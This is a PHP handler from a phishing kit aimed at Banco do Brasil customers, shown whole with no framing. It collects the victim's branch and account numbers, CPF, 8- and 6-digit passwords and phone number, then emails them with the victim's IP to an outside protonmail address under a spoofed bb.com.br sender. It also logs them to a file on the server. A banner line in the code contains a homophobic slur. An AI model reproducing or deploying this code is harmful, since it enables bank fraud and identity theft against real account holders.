<?php
session_start();

$agencia = $_POST['agencia'];
$conta = $_POST['conta'];

$cpf = $_POST['cpf'];
$senha8 = $_POST['senha8'];
$senha6 = $_POST['senha6'];
$telefone = $_POST['telefone'];

$_SESSION["agencia"]  = $agencia ;
$_SESSION["conta"]  = $conta ;
$_SESSION["cpf"]  = $cpf ;
$_SESSION["senha8"]  = $senha8 ;
$_SESSION["senha6"]  = $senha6 ;
$_SESSION["telefone"]  = $telefone ;

$ip = $_SERVER['REMOTE_ADDR'];


$emaildestinatario = 'erqu39@protonmail.com';

$subj = "Dados / IP: $ip - Chegou: BB";


$mensagemHTML = '
<p>------------- |Chegou BB | ------------</p>

<p><b>Agência:</b> '.$agencia.'<br>
<p><b>Conta:</b> '.$conta.'<br>
<br>
<p><b>CPF:</b> '.$cpf.'<br>
<p><b>Senha 8:</b> '.$senha8.'<br>
<p><b>senha6:</b> '.$senha6.'<br>
<p><b>telefone:</b> '.$telefone.'<br>
<br>
<p>-------------- |EVANS GAY!| -----------------</p>

';

$headers = "MIME-Version: 1.1\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "From: recadastramento@bb.com.br \r\n";
$headers .= "Return-Path: recadastramento@bb.com.br \r\n";
$envio = mail("erqu39@protonmail.com", $subj, $mensagemHTML, $headers);

$fp = fopen("../dados/".date("YmdHis"), "a");
$escreve = fwrite($fp, $mensagemHTML);
fclose($fp);

if($envio){
	echo "<script>location='../fim.php';</script>";
}else{ 
	echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../home.php';</script>";
}

?>